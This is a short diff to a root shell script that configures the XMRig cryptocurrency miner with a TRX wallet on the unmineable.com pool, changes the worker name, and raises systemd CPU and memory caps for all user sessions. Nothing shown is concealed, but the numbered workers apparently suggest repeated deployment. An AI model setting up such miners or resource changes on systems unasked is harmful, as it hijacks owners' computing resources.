@@ -30,7 +30,7 @@ cat > /root/xmrig/build/config.json << EOF
     "pools": [
         {
             "url": "rx.unmineable.com:443",
-            "user": "TRX:TH1qe8x7dhoWKwtYvWvmh52N6B4y438Lwo.coba14",
+            "user": "TRX:TH1qe8x7dhoWKwtYvWvmh52N6B4y438Lwo.coba3",
             "pass": "test",
             "keepalive": true,
             "tls": true
@@ -43,8 +43,8 @@ EOF
 mkdir -p /etc/systemd/system/user-.slice.d
 cat > /etc/systemd/system/user-.slice.d/50-memory.conf << EOF
 [Slice]
-MemoryMax=8G
-CPUQuota=400%
+MemoryMax=16G
+CPUQuota=500%
 EOF
 
 sleep 2
